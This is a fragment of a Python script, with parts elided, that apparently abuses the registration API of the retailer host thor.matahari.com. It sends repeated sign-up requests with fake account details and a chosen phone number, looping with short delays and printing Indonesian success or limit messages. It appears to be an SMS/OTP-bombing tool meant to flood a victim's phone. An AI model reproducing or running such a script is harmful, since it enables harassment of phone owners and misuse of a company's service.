...
heder = {'Host': 'thor.matahari.com',
           ...
           'clientid': 'mds_mweb',
           'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Realme 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
...
data = {'emailAddress': 'Slaiaazer1945@mail.com',
           'firstName': 'Hashinging',
           'lastName': 'Slaiser',
           'mobileNumber': no,
           'mccCardNumber': '',
           'password': 'Dsaadasd4005',
           'referralCode': '',
...
for i in range(jml):
      ...
      if 'eror' in sec.text:
           print(f'{i+1}. Gagal [LIMIT] {no}')
      else:
           print(f'{i+1}. Sukses {no}')
      time.sleep(1.5)
